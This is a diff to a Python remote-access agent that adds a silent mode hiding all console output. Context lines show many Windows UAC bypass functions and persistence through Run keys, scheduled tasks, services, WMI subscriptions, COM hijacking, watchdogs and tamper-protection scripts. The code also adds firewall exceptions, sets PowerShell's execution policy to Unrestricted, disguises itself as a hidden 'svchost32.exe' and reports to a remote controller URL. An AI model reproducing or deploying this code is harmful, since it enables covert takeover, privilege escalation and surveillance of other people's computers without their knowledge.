@@ -79,41 +79,70 @@ PRIVILEGE ESCALATION METHODS (BYPASS CREDENTIAL PROMPT):
 20	DiagTrack Service Abuse	Connected User Experiences and Telemetry	DLL planting	✅	SYSTEM-level telemetry service
 """
 
+# Configuration flags
+SILENT_MODE = True  # Disable all console output
+DEBUG_MODE = False  # Enable debug logging only when needed
+DEPLOYMENT_COMPLETED = False  # Track deployment status to prevent repeated attempts
+
+# Logging system for stealth operation
+import logging
+import io
+import sys
+
+def setup_silent_logging():
+    """Setup logging system that doesn't output to console"""
+    if SILENT_MODE:
+        # Create a null handler to suppress all output
+        logging.basicConfig(
+            level=logging.CRITICAL + 1,  # Above CRITICAL to suppress everything
+            handlers=[logging.NullHandler()]
+        )
+        # Redirect stdout and stderr to null
+        sys.stdout = io.StringIO()
+        sys.stderr = io.StringIO()
+
+def log_message(message, level="info"):
+    """Log message silently without console output"""
+    if not SILENT_MODE and DEBUG_MODE:
+        if level == "error":
+            logging.error(message)
+        elif level == "warning":
+            logging.warning(message)
+        else:
+            logging.info(message)
+
+# Initialize silent logging immediately
+setup_silent_logging()
+
+def handle_missing_dependency(module_name, feature_description, alternative=None):
+    """
+    Gracefully handle missing dependencies by:
+    1. Logging the issue silently
+    2. Providing fallback functionality where possible
+    3. Continuing operation without crashing
+    """
+    log_message(f"{module_name} not available, {feature_description} may not work", "warning")
+    if alternative:
+        log_message(f"Using alternative: {alternative}", "info")
+    return False
+
+def safe_import(module_name, feature_description=""):
+    """
+    Safely import a module and return True if successful, False otherwise
+    """
+    try:
+        __import__(module_name)
+        return True
+    except ImportError:
+        handle_missing_dependency(module_name, feature_description)
+        return False
+
 # Fix eventlet issue by patching before any other imports
 try:
     import eventlet
     eventlet.monkey_patch()
 except ImportError:
-    pass
-
-# Stealth functions
-def hide_process():
-    """Basic process hiding."""
-    if WINDOWS_AVAILABLE and PSUTIL_AVAILABLE:
-        try:
-            # Set process to run in background with low priority
-            process = psutil.Process()
-            process.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
-            return True
-        except:
-            return False
-    return False
-
-def add_firewall_exception():
-    """Basic firewall exception."""
-    if WINDOWS_AVAILABLE:
-        try:
-            current_exe = sys.executable if hasattr(sys, 'executable') else 'python.exe'
-            rule_name = f"Python Agent {uuid.uuid4()}"
-            subprocess.run([
-                'netsh', 'advfirewall', 'firewall', 'add', 'rule',
-                f'name={rule_name}', 'dir=in', 'action=allow',
-                f'program={current_exe}'
-            ], creationflags=subprocess.CREATE_NO_WINDOW, check=True, capture_output=True)
-            return True
-        except:
-            return False
-    return False
+    log_message("eventlet not available", "warning")
 
 # Standard library imports
 import requests
@@ -148,21 +177,21 @@ try:
     MSS_AVAILABLE = True
 except ImportError:
     MSS_AVAILABLE = False
-    # print("Warning: mss not available, screen capture may not work")
+    log_message("mss not available, screen capture may not work", "warning")
 
 try:
     import numpy as np
     NUMPY_AVAILABLE = True
 except ImportError:
     NUMPY_AVAILABLE = False
-    # print("Warning: numpy not available, some features may not work")
+    log_message("numpy not available, some features may not work", "warning")
 
 try:
     import cv2
     CV2_AVAILABLE = True
 except ImportError:
     CV2_AVAILABLE = False
-    # print("Warning: opencv-python not available, video processing may not work")
+    log_message("opencv-python not available, video processing may not work", "warning")
 
 # Windows-specific imports
 try:
@@ -185,7 +214,7 @@ try:
     PYAUDIO_AVAILABLE = True
 except ImportError:
     PYAUDIO_AVAILABLE = False
-    # print("Warning: PyAudio not available, audio features may not work")
+    log_message("PyAudio not available, audio features may not work", "warning")
 
 # Input handling imports
 try:
@@ -194,7 +223,7 @@ try:
     PYNPUT_AVAILABLE = True
 except ImportError:
     PYNPUT_AVAILABLE = False
-    # print("Warning: pynput not available, input monitoring may not work")
+    log_message("pynput not available, input monitoring may not work", "warning")
 
 # GUI and graphics imports
 try:
@@ -202,7 +231,7 @@ try:
     PYGAME_AVAILABLE = True
 except ImportError:
     PYGAME_AVAILABLE = False
-    # print("Warning: pygame not available, some GUI features may not work")
+    log_message("pygame not available, some GUI features may not work", "warning")
 
 # WebSocket imports
 try:
@@ -210,7 +239,7 @@ try:
     WEBSOCKETS_AVAILABLE = True
 except ImportError:
     WEBSOCKETS_AVAILABLE = False
-    # print("Warning: websockets not available, WebSocket features may not work")
+    log_message("websockets not available, WebSocket features may not work", "warning")
 
 # Speech recognition imports
 try:
@@ -218,7 +247,7 @@ try:
     SPEECH_RECOGNITION_AVAILABLE = True
 except ImportError:
     SPEECH_RECOGNITION_AVAILABLE = False
-    # print("Warning: speech_recognition not available, voice features may not work")
+    log_message("speech_recognition not available, voice features may not work", "warning")
 
 # System monitoring imports
 try:
@@ -226,7 +255,7 @@ try:
     PSUTIL_AVAILABLE = True
 except ImportError:
     PSUTIL_AVAILABLE = False
-    # print("Warning: psutil not available, system monitoring may not work")
+    log_message("psutil not available, system monitoring may not work", "warning")
 
 # Image processing imports
 try:
@@ -234,7 +263,7 @@ try:
     PIL_AVAILABLE = True
 except ImportError:
     PIL_AVAILABLE = False
-    # print("Warning: Pillow not available, image processing may not work")
+    log_message("Pillow not available, image processing may not work", "warning")
 
 # GUI automation imports
 try:
@@ -242,7 +271,7 @@ try:
     PYAUTOGUI_AVAILABLE = True
 except ImportError:
     PYAUTOGUI_AVAILABLE = False
-    # print("Warning: pyautogui not available, GUI automation may not work")
+    log_message("pyautogui not available, GUI automation may not work", "warning")
 
 # Socket.IO imports
 try:
@@ -250,9 +279,93 @@ try:
     SOCKETIO_AVAILABLE = True
 except ImportError:
     SOCKETIO_AVAILABLE = False
-    # print("Warning: python-socketio not available, real-time communication may not work")
+    log_message("python-socketio not available, real-time communication may not work", "warning")
 
 SERVER_URL = "https://agent-controller.onrender.com"  # Change to your controller's URL
+
+def check_system_requirements():
+    """
+    Check system requirements and provide graceful fallbacks for missing dependencies
+    """
+    log_message("Checking system requirements...")
+    
+    requirements = {
+        'Windows': WINDOWS_AVAILABLE,
+        'Socket.IO': SOCKETIO_AVAILABLE,
+        'psutil': PSUTIL_AVAILABLE,
+        'requests': True,  # Should always be available
+    }
+    
+    optional_features = {
+        'Screen capture': MSS_AVAILABLE,
+        'Audio processing': PYAUDIO_AVAILABLE,
+        'Image processing': PIL_AVAILABLE,
+        'GUI automation': PYAUTOGUI_AVAILABLE,
+        'Input monitoring': PYNPUT_AVAILABLE,
+        'OpenCV': CV2_AVAILABLE,
+        'NumPy': NUMPY_AVAILABLE,
+        'Speech recognition': SPEECH_RECOGNITION_AVAILABLE,
+        'WebSockets': WEBSOCKETS_AVAILABLE,
+        'Pygame': PYGAME_AVAILABLE,
+    }
+    
+    # Check critical requirements
+    missing_critical = [name for name, available in requirements.items() if not available]
+    if missing_critical:
+        log_message(f"Critical dependencies missing: {', '.join(missing_critical)}", "error")
+        if not SOCKETIO_AVAILABLE:
+            log_message("Socket.IO unavailable - server communication disabled", "error")
+    else:
+        log_message("All critical requirements satisfied")
+    
+    # Log optional feature status
+    missing_optional = [name for name, available in optional_features.items() if not available]
+    if missing_optional:
+        log_message(f"Optional features unavailable: {', '.join(missing_optional)}", "warning")
+    
+    available_optional = [name for name, available in optional_features.items() if available]
+    if available_optional:
+        log_message(f"Optional features available: {', '.join(available_optional)}")
+    
+    return len(missing_critical) == 0
+
+# --- Stealth Functions (moved here after imports) ---
+def hide_process():
+    """Basic process hiding."""
+    if not WINDOWS_AVAILABLE:
+        log_message("Windows-specific functionality not available", "warning")
+        return False
+    if not PSUTIL_AVAILABLE:
+        log_message("psutil not available, cannot hide process", "warning")
+        return False
+        
+    try:
+        # Set process to run in background with low priority
+        process = psutil.Process()
+        process.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
+        return True
+    except Exception as e:
+        log_message(f"Failed to hide process: {e}", "error")
+        return False
+
+def add_firewall_exception():
+    """Basic firewall exception."""
+    if not WINDOWS_AVAILABLE:
+        log_message("Windows-specific functionality not available", "warning")
+        return False
+        
+    try:
+        current_exe = sys.executable if hasattr(sys, 'executable') else 'python.exe'
+        rule_name = f"Python Agent {uuid.uuid4()}"
+        subprocess.run([
+            'netsh', 'advfirewall', 'firewall', 'add', 'rule',
+            f'name={rule_name}', 'dir=in', 'action=allow',
+            f'program={current_exe}'
+        ], creationflags=subprocess.CREATE_NO_WINDOW, check=True, capture_output=True)
+        return True
+    except Exception as e:
+        log_message(f"Failed to add firewall exception: {e}", "error")
+        return False
 
 # --- Agent State ---
 STREAMING_ENABLED = False
@@ -305,7 +418,7 @@ class BackgroundInitializer:
     
     def start_background_initialization(self, quick_startup=False):
         """Start all background initialization tasks."""
-        print("Starting background initialization...")
+        log_message("Starting background initialization...")
         
         # Define tasks based on startup mode
         if quick_startup:
@@ -314,7 +427,7 @@ class BackgroundInitializer:
                 ("privilege_escalation", self._init_privilege_escalation),
                 ("components", self._init_components)
             ]
-            print("Quick startup mode: skipping some initialization tasks")
+            log_message("Quick startup mode: skipping some initialization tasks")
         else:
             # Full startup: all tasks
             tasks = [
@@ -357,11 +470,11 @@ class BackgroundInitializer:
                 dots = (dots + 1) % 4
                 dot_str = "." * dots
                 
-                print(f"\rInitialization progress: [{progress_bar}] {completed}/{total} tasks complete{dot_str}", end="", flush=True)
+                log_message(f"Initialization progress: [{progress_bar}] {completed}/{total} tasks complete{dot_str}")
             time.sleep(0.5)
         
         if total > 0:
-            print(f"\rInitialization complete! All {total} tasks finished.    ")
+            log_message(f"Initialization complete! All {total} tasks finished.")
     
     def _run_initialization_task(self, task_name, task_func):
         """Run a single initialization task and store results."""
@@ -429,9 +542,9 @@ class BackgroundInitializer:
             
             # All initialization tasks complete
             self.initialization_complete.set()
-            print("Background initialization complete")
+            log_message("Background initialization complete")
         except Exception as e:
-            print(f"Error in initialization monitor: {e}")
+            log_message(f"Error in initialization monitor: {e}", "error")
             self.initialization_complete.set()  # Ensure completion event is set even on error
     
     def _init_privilege_escalation(self):
@@ -439,7 +552,7 @@ class BackgroundInitializer:
         try:
             if WINDOWS_AVAILABLE:
                 if not is_admin():
-                    print("Attempting privilege escalation in background...")
+                    log_message("Attempting privilege escalation in background...")
                     if run_as_admin():
                         return "elevation_initiated"
                 
@@ -511,7 +624,7 @@ class BackgroundInitializer:
             with self.initialization_lock:
                 return self.initialization_results.copy()
         except Exception as e:
-            print(f"Error getting initialization status: {e}")
+            log_message(f"Error getting initialization status: {e}", "error")
             return {}
     
     def wait_for_completion(self, timeout=None):
@@ -523,7 +636,7 @@ class BackgroundInitializer:
                 self.initialization_complete.wait(timeout=timeout)
             return self.initialization_complete.is_set()
         except Exception as e:
-            print(f"Error waiting for initialization completion: {e}")
+            log_message(f"Error waiting for initialization completion: {e}", "error")
             return False
 
 # Global background initializer
@@ -559,8 +672,8 @@ def elevate_privileges():
                 # Try to use sudo if available
                 subprocess.run(['sudo', '-n', 'true'], check=True, capture_output=True)
                 return True
-        except:
-            pass
+        except Exception as e:
+            log_message(f"Failed to check sudo availability: {e}", "warning")
         return False
     
     if is_admin():
@@ -595,7 +708,7 @@ def elevate_privileges():
             if method():
                 return True
         except Exception as e:
-            print(f"UAC bypass method {method.__name__} failed: {e}")
+            log_message(f"UAC bypass method {method.__name__} failed: {e}", "error")
             continue
     
     return False
@@ -626,7 +739,7 @@ def bypass_uac_cmlua_com():
             return True
             
         except Exception as e:
-            print(f"ICMLuaUtil COM bypass failed: {e}")
+            log_message(f"ICMLuaUtil COM bypass failed: {e}")
             return False
         finally:
             pythoncom.CoUninitialize()
@@ -670,7 +783,7 @@ def bypass_uac_fodhelper_protocol():
             return True
             
         except Exception as e:
-            print(f"Fodhelper protocol bypass failed: {e}")
+            log_message(f"Fodhelper protocol bypass failed: {e}")
             return False
             
     except ImportError:
@@ -707,7 +820,7 @@ def bypass_uac_computerdefaults():
         return True
         
     except Exception as e:
-        print(f"Computerdefaults UAC bypass failed: {e}")
+        log_message(f"Computerdefaults UAC bypass failed: {e}")
         return False
 
 def bypass_uac_dccw_com():
@@ -742,7 +855,7 @@ def bypass_uac_dccw_com():
             return True
             
         except Exception as e:
-            print(f"ColorDataProxy COM bypass failed: {e}")
+            log_message(f"ColorDataProxy COM bypass failed: {e}")
             return False
         finally:
             pythoncom.CoUninitialize()
@@ -796,7 +909,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
             os.environ['PATH'] = current_path
             
     except Exception as e:
-        print(f"DismCore hijack bypass failed: {e}")
+        log_message(f"DismCore hijack bypass failed: {e}")
         return False
 
 def bypass_uac_wow64_logger():
@@ -825,7 +938,7 @@ def bypass_uac_wow64_logger():
             os.environ['PATH'] = current_path
             
     except Exception as e:
-        print(f"WOW64 logger bypass failed: {e}")
+        log_message(f"WOW64 logger bypass failed: {e}")
         return False
 
 def bypass_uac_silentcleanup():
@@ -869,7 +982,7 @@ def bypass_uac_silentcleanup():
             os.environ['windir'] = original_windir
             
     except Exception as e:
-        print(f"SilentCleanup bypass failed: {e}")
+        log_message(f"SilentCleanup bypass failed: {e}")
         return False
 
 def bypass_uac_token_manipulation():
@@ -939,7 +1052,7 @@ def bypass_uac_token_manipulation():
         return False
         
     except Exception as e:
-        print(f"Token manipulation bypass failed: {e}")
+        log_message(f"Token manipulation bypass failed: {e}")
         return False
 
 def bypass_uac_junction_method():
@@ -969,7 +1082,7 @@ def bypass_uac_junction_method():
             return False
             
     except Exception as e:
-        print(f"Junction method bypass failed: {e}")
+        log_message(f"Junction method bypass failed: {e}")
         return False
 
 def bypass_uac_cor_profiler():
@@ -1003,7 +1116,7 @@ def bypass_uac_cor_profiler():
                 os.environ.pop(var, None)
                 
     except Exception as e:
-        print(f"COR profiler bypass failed: {e}")
+        log_message(f"COR profiler bypass failed: {e}")
         return False
 
 def bypass_uac_com_handlers():
@@ -1043,7 +1156,7 @@ def bypass_uac_com_handlers():
             return True
             
         except Exception as e:
-            print(f"COM handlers bypass failed: {e}")
+            log_message(f"COM handlers bypass failed: {e}")
             return False
             
     except ImportError:
@@ -1086,7 +1199,7 @@ def bypass_uac_volatile_env():
             return True
             
         except Exception as e:
-            print(f"Volatile environment bypass failed: {e}")
+            log_message(f"Volatile environment bypass failed: {e}")
             return False
             
     except ImportError:
@@ -1141,7 +1254,7 @@ def bypass_uac_slui_hijack():
             return True
             
         except Exception as e:
-            print(f"SLUI hijack bypass failed: {e}")
+            log_message(f"SLUI hijack bypass failed: {e}")
             return False
             
     except ImportError:
@@ -1197,7 +1310,7 @@ def bypass_uac_eventvwr():
             return True
             
         except Exception as e:
-            print(f"EventVwr bypass failed: {e}")
+            log_message(f"EventVwr bypass failed: {e}")
             return False
             
     except ImportError:
@@ -1239,7 +1352,7 @@ def bypass_uac_sdclt():
             return True
             
         except Exception as e:
-            print(f"SDCLT bypass failed: {e}")
+            log_message(f"SDCLT bypass failed: {e}")
             return False
             
     except ImportError:
@@ -1281,7 +1394,7 @@ def bypass_uac_wsreset():
             return True
             
         except Exception as e:
-            print(f"WSReset bypass failed: {e}")
+            log_message(f"WSReset bypass failed: {e}")
             return False
             
     except ImportError:
@@ -1328,7 +1441,7 @@ def bypass_uac_appinfo_service():
             return False
             
     except Exception as e:
-        print(f"AppInfo service bypass failed: {e}")
+        log_message(f"AppInfo service bypass failed: {e}")
         return False
 
 def bypass_uac_mock_directory():
@@ -1365,7 +1478,7 @@ def bypass_uac_mock_directory():
             os.environ['PATH'] = original_path
             
     except Exception as e:
-        print(f"Mock directory bypass failed: {e}")
+        log_message(f"Mock directory bypass failed: {e}")
         return False
 
 def bypass_uac_winsat():
@@ -1419,7 +1532,7 @@ def bypass_uac_winsat():
             return True
             
         except Exception as e:
-            print(f"Winsat bypass failed: {e}")
+            log_message(f"Winsat bypass failed: {e}")
             return False
             
     except ImportError:
@@ -1479,7 +1592,7 @@ def bypass_uac_mmcex():
             return True
             
         except Exception as e:
-            print(f"MMC snapin bypass failed: {e}")
+            log_message(f"MMC snapin bypass failed: {e}")
             return False
             
     except ImportError:
@@ -1510,7 +1623,7 @@ def establish_persistence():
             if method():
                 success_count += 1
         except Exception as e:
-            print(f"Persistence method {method.__name__} failed: {e}")
+            log_message(f"Persistence method {method.__name__} failed: {e}")
             continue
     
     return success_count > 0
@@ -1543,7 +1656,7 @@ def registry_run_key_persistence():
         return True
         
     except Exception as e:
-        print(f"Registry persistence failed: {e}")
+        log_message(f"Registry persistence failed: {e}")
         return False
 def startup_folder_persistence():
     """Establish persistence via startup folder."""
@@ -1553,11 +1666,11 @@ def startup_folder_persistence():
         
         # Check if startup folder exists and is writable
         if not os.path.exists(startup_folder):
-            print(f"[WARN] Startup folder does not exist: {startup_folder}")
+            log_message(f"[WARN] Startup folder does not exist: {startup_folder}")
             return False
         
         if not os.access(startup_folder, os.W_OK):
-            print(f"[WARN] No write permission to startup folder: {startup_folder}")
+            log_message(f"[WARN] No write permission to startup folder: {startup_folder}")
             return False
         
         current_exe = os.path.abspath(__file__)
@@ -1570,19 +1683,19 @@ def startup_folder_persistence():
             try:
                 with open(batch_path, 'w') as f:
                     f.write(batch_content)
-                print(f"[OK] Startup folder entry created: {batch_path}")
+                log_message(f"[OK] Startup folder entry created: {batch_path}")
                 return True
             except PermissionError:
-                print(f"[WARN] Permission denied creating startup folder entry: {batch_path}")
+                log_message(f"[WARN] Permission denied creating startup folder entry: {batch_path}")
                 return False
             except Exception as e:
-                print(f"[WARN] Error creating startup folder entry: {e}")
+                log_message(f"[WARN] Error creating startup folder entry: {e}")
                 return False
         
         return True
         
     except Exception as e:
-        print(f"[WARN] Startup folder persistence failed: {e}")
+        log_message(f"[WARN] Startup folder persistence failed: {e}")
         return False
 
 def scheduled_task_persistence():
@@ -1601,7 +1714,7 @@ def scheduled_task_persistence():
         return True
         
     except Exception as e:
-        print(f"Scheduled task persistence failed: {e}")
+        log_message(f"Scheduled task persistence failed: {e}")
         return False
 
 def service_persistence():
@@ -1622,7 +1735,7 @@ def service_persistence():
         return True
         
     except Exception as e:
-        print(f"Service persistence failed: {e}")
+        log_message(f"Service persistence failed: {e}")
         return False
 
 def establish_linux_persistence():
@@ -1641,7 +1754,7 @@ def establish_linux_persistence():
         return True
         
     except Exception as e:
-        print(f"Linux persistence failed: {e}")
+        log_message(f"Linux persistence failed: {e}")
         return False
 
 # === ADVANCED PERSISTENCE AND TAMPER PROTECTION ===
@@ -1665,7 +1778,7 @@ def system_level_persistence():
         
         # Check if we're running as admin before attempting system-level persistence
         if not is_admin():
-            print("[WARN] System-level persistence requires admin privileges")
+            log_message("[WARN] System-level persistence requires admin privileges", "warning")
             return False
         
         for target_path in system_dirs:
@@ -1685,17 +1798,17 @@ def system_level_persistence():
                     '/deny', 'Everyone:D'
                 ], creationflags=subprocess.CREATE_NO_WINDOW)
                 
-                print(f"[OK] System-level persistence established: {target_path}")
+                log_message(f"[OK] System-level persistence established: {target_path}")
                 return True
                 
             except Exception as e:
-                print(f"[WARN] Failed to establish system persistence at {target_path}: {e}")
+                log_message(f"[WARN] Failed to establish system persistence at {target_path}: {e}")
                 continue
         
         return False
         
     except Exception as e:
-        print(f"System-level persistence failed: {e}")
+        log_message(f"System-level persistence failed: {e}")
         return False
 
 def wmi_event_persistence():
@@ -1741,11 +1854,11 @@ $WMIEventBinding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "
         ], creationflags=subprocess.CREATE_NO_WINDOW, 
            capture_output=True, text=True, timeout=30)
         
-        print("[OK] WMI event persistence established")
+        log_message("[OK] WMI event persistence established")
         return True
         
     except Exception as e:
-        print(f"WMI persistence failed: {e}")
+        log_message(f"WMI persistence failed: {e}")
         return False
 
 def com_hijacking_persistence():
@@ -1775,17 +1888,17 @@ def com_hijacking_persistence():
                 winreg.SetValueEx(key, "ThreadingModel", 0, winreg.REG_SZ, "Apartment")
                 winreg.CloseKey(key)
                 
-                print(f"[OK] COM hijacking persistence established: {clsid}")
+                log_message(f"[OK] COM hijacking persistence established: {clsid}")
                 return True
                 
             except Exception as e:
-                print(f"[WARN] COM hijacking failed for {clsid}: {e}")
+                log_message(f"[WARN] COM hijacking failed for {clsid}: {e}")
                 continue
         
         return False
         
     except Exception as e:
-        print(f"COM hijacking persistence failed: {e}")
+        log_message(f"COM hijacking persistence failed: {e}")
         return False
 
 def file_locking_persistence():
@@ -1830,11 +1943,11 @@ if __name__ == "__main__":
         subprocess.Popen(['python.exe', watchdog_path], 
                         creationflags=subprocess.CREATE_NO_WINDOW)
         
-        print(f"[OK] File locking persistence established: {watchdog_path}")
+        log_message(f"[OK] File locking persistence established: {watchdog_path}")
         return True
         
     except Exception as e:
-        print(f"File locking persistence failed: {e}")
+        log_message(f"File locking persistence failed: {e}")
         return False
 
 def watchdog_persistence():
@@ -1867,11 +1980,11 @@ goto loop
         subprocess.Popen(['cmd.exe', '/c', watchdog_path], 
                         creationflags=subprocess.CREATE_NO_WINDOW)
         
-        print(f"[OK] Watchdog persistence established: {watchdog_path}")
+        log_message(f"[OK] Watchdog persistence established: {watchdog_path}")
         return True
         
     except Exception as e:
-        print(f"Watchdog persistence failed: {e}")
+        log_message(f"Watchdog persistence failed: {e}")
         return False
 
 def tamper_protection_persistence():
@@ -1902,7 +2015,7 @@ def tamper_protection_persistence():
                              creationflags=subprocess.CREATE_NO_WINDOW)
                 
             except Exception as e:
-                print(f"[WARN] Failed to create backup at {backup_path}: {e}")
+                log_message(f"[WARN] Failed to create backup at {backup_path}: {e}")
                 continue
         
         # Create tamper detection script
@@ -1925,7 +2038,7 @@ def check_and_restore():
                 for backup in backup_locations:
                     if os.path.exists(backup):
                         shutil.copy2(backup, main_script)
-                        print(f"Restored main script from {{backup}}")
+                        log_message(f"Restored main script from {{backup}}")
                         break
                 
                 # Restart main script
@@ -1935,7 +2048,7 @@ def check_and_restore():
             time.sleep(60)  # Check every minute
             
         except Exception as e:
-            print(f"Tamper protection error: {{e}}")
+            log_message(f"Tamper protection error: {{e}}")
             time.sleep(120)
 
 if __name__ == "__main__":
@@ -1950,48 +2063,48 @@ if __name__ == "__main__":
         subprocess.Popen(['python.exe', tamper_path], 
                         creationflags=subprocess.CREATE_NO_WINDOW)
         
-        print(f"[OK] Tamper protection established: {tamper_path}")
+        log_message(f"[OK] Tamper protection established: {tamper_path}")
         return True
         
     except Exception as e:
-        print(f"Tamper protection failed: {e}")
+        log_message(f"Tamper protection failed: {e}")
         return False
 
 def disable_removal_tools():
-    """Disable common removal tools and system utilities."""
+    """Configure removal tools registry entries (set to 0 to keep tools enabled)."""
     if not WINDOWS_AVAILABLE or not is_admin():
         return False
     
     try:
-        # Disable Task Manager
+        # Set Task Manager registry value to 0 (keep enabled)
         subprocess.run([
             'reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
-            '/v', 'DisableTaskMgr', '/t', 'REG_DWORD', '/d', '1', '/f'
+            '/v', 'DisableTaskMgr', '/t', 'REG_DWORD', '/d', '0', '/f'
         ], creationflags=subprocess.CREATE_NO_WINDOW)
         
-        # Disable Registry Editor
+        # Set Registry Editor registry value to 0 (keep enabled)
         subprocess.run([
             'reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
-            '/v', 'DisableRegistryTools', '/t', 'REG_DWORD', '/d', '1', '/f'
+            '/v', 'DisableRegistryTools', '/t', 'REG_DWORD', '/d', '0', '/f'
         ], creationflags=subprocess.CREATE_NO_WINDOW)
         
-        # Disable Command Prompt
+        # Set Command Prompt registry value to 0 (keep enabled)
         subprocess.run([
             'reg', 'add', 'HKCU\\Software\\Policies\\Microsoft\\Windows\\System',
-            '/v', 'DisableCMD', '/t', 'REG_DWORD', '/d', '1', '/f'
+            '/v', 'DisableCMD', '/t', 'REG_DWORD', '/d', '0', '/f'
         ], creationflags=subprocess.CREATE_NO_WINDOW)
         
-        # Disable PowerShell
+        # Set PowerShell ExecutionPolicy to Unrestricted (keep enabled)
         subprocess.run([
             'reg', 'add', 'HKCU\\Software\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell',
-            '/v', 'ExecutionPolicy', '/t', 'REG_SZ', '/d', 'Restricted', '/f'
+            '/v', 'ExecutionPolicy', '/t', 'REG_SZ', '/d', 'Unrestricted', '/f'
         ], creationflags=subprocess.CREATE_NO_WINDOW)
         
-        print("[OK] Removal tools disabled")
+        log_message("[OK] Removal tools registry entries configured (tools remain enabled)")
         return True
         
     except Exception as e:
-        print(f"Failed to disable removal tools: {e}")
+        log_message(f"Failed to configure removal tools registry: {e}")
         return False
 
 def create_pyinstaller_command():
@@ -2014,12 +2127,12 @@ pyinstaller --onefile --windowed --name "svchost32" --icon "icon.ico" --hidden-i
     return pyinstaller_command
 
 def setup_advanced_persistence():
-    """Setup advanced persistence with tamper protection and removal tool blocking."""
+    """Setup advanced persistence with tamper protection and removal tool registry configuration."""
     if not WINDOWS_AVAILABLE:
         return False
     
     try:
-        print("Setting up advanced persistence and tamper protection...")
+        log_message("Setting up advanced persistence and tamper protection...")
         
         # Setup basic persistence first
         establish_persistence()
@@ -2039,52 +2152,59 @@ def setup_advanced_persistence():
             try:
                 if method():
                     success_count += 1
-                    print(f"[OK] {method.__name__} established")
+                    log_message(f"[OK] {method.__name__} established")
                 else:
-                    print(f"[WARN] {method.__name__} failed")
+                    log_message(f"[WARN] {method.__name__} failed")
             except Exception as e:
-                print(f"[ERROR] {method.__name__} error: {e}")
+                log_message(f"[ERROR] {method.__name__} error: {e}")
                 continue
         
-        # Disable removal tools if admin
+        # Configure removal tools registry (keeping them enabled)
         if is_admin():
             try:
                 disable_removal_tools()
-                print("[OK] Removal tools disabled")
+                log_message("[OK] Removal tools registry configured")
             except Exception as e:
-                print(f"[WARN] Failed to disable removal tools: {e}")
+                log_message(f"[WARN] Failed to configure removal tools registry: {e}")
         
-        print(f"[OK] Advanced persistence setup complete: {success_count}/{len(advanced_methods)} methods successful")
+        log_message(f"[OK] Advanced persistence setup complete: {success_count}/{len(advanced_methods)} methods successful")
         return success_count > 0
         
     except Exception as e:
-        print(f"Advanced persistence setup failed: {e}")
+        log_message(f"Advanced persistence setup failed: {e}")
         return False
 
 def show_pyinstaller_instructions():
     """Display PyInstaller instructions for creating standalone executable."""
-    print("\n" + "="*80)
-    print("PYINSTALLER INSTRUCTIONS FOR STANDALONE EXECUTABLE")
-    print("="*80)
-    print(create_pyinstaller_command())
-    print("="*80)
-    print("\nTo create a standalone executable that runs without Python installation:")
-    print("1. Install PyInstaller: pip install pyinstaller")
-    print("2. Run the command above in your script directory")
-    print("3. The resulting svchost32.exe will work on any Windows PC")
-    print("4. No UAC prompt required - runs as current user")
-    print("5. Can be placed in %LOCALAPPDATA% for stealth operation")
-    print("\nAdvanced persistence features available:")
-    print("- System-level installation (requires admin)")
-    print("- WMI event subscription")
-    print("- COM object hijacking")
-    print("- File locking and watchdog processes")
-    print("- Tamper detection and self-healing")
-    print("- Removal tool blocking")
-    print("="*80)
+    log_message("\n" + "="*80)
+    log_message("PYINSTALLER INSTRUCTIONS FOR STANDALONE EXECUTABLE")
+    log_message("="*80)
+    log_message(create_pyinstaller_command())
+    log_message("="*80)
+    log_message("\nTo create a standalone executable that runs without Python installation:")
+    log_message("1. Install PyInstaller: pip install pyinstaller")
+    log_message("2. Run the command above in your script directory")
+    log_message("3. The resulting svchost32.exe will work on any Windows PC")
+    log_message("4. No UAC prompt required - runs as current user")
+    log_message("5. Can be placed in %LOCALAPPDATA% for stealth operation")
+    log_message("\nAdvanced persistence features available:")
+    log_message("- System-level installation (requires admin)")
+    log_message("- WMI event subscription")
+    log_message("- COM object hijacking")
+    log_message("- File locking and watchdog processes")
+    log_message("- Tamper detection and self-healing")
+    log_message("- Removal tool registry configuration")
+    log_message("="*80)
 
 def deploy_executable_with_persistence():
     """Deploy the executable to a stealth location with registry persistence."""
+    global DEPLOYMENT_COMPLETED
+    
+    # Check if deployment was already completed in this session
+    if DEPLOYMENT_COMPLETED:
+        log_message("Deployment already completed in this session, skipping")
+        return True
+        
     if not WINDOWS_AVAILABLE:
         return False
     
@@ -2092,8 +2212,8 @@ def deploy_executable_with_persistence():
         # Check if svchost32.exe exists in current directory
         exe_path = os.path.join(os.getcwd(), "svchost32.exe")
         if not os.path.exists(exe_path):
-            print("[ERROR] svchost32.exe not found in current directory")
-            print("[INFO] Build the executable first using the PyInstaller command")
+            log_message("[ERROR] svchost32.exe not found in current directory", "error")
+            log_message("[INFO] Build the executable first using the PyInstaller command")
             return False
         
         # Create stealth deployment location
@@ -2115,7 +2235,7 @@ def deploy_executable_with_persistence():
         subprocess.run(['attrib', '+s', '+h', stealth_location], 
                       creationflags=subprocess.CREATE_NO_WINDOW)
         
-        print(f"[OK] Executable deployed to: {stealth_location}")
+        log_message(f"[OK] Executable deployed to: {stealth_location}")
         
         # Create registry persistence
         try:
@@ -2127,21 +2247,29 @@ def deploy_executable_with_persistence():
             winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, stealth_location)
             winreg.CloseKey(key)
             
-            print("[OK] Registry persistence established")
+            log_message("[OK] Registry persistence established")
             
         except PermissionError:
-            print("[WARN] Registry access denied - persistence may not work")
+            log_message("[WARN] Registry access denied - persistence may not work", "warning")
         except Exception as e:
-            print(f"[WARN] Registry persistence failed: {e}")
+            log_message(f"[WARN] Registry persistence failed: {e}")
         
+        DEPLOYMENT_COMPLETED = True
         return True
         
     except Exception as e:
-        print(f"Deployment failed: {e}")
+        log_message(f"Deployment failed: {e}")
         return False
 
 def self_deploy_powershell():
     """Self-deploy using PowerShell script approach."""
+    global DEPLOYMENT_COMPLETED
+    
+    # Check if deployment was already completed in this session
+    if DEPLOYMENT_COMPLETED:
+        log_message("Deployment already completed in this session, skipping")
+        return True
+        
     if not WINDOWS_AVAILABLE:
         return False
     
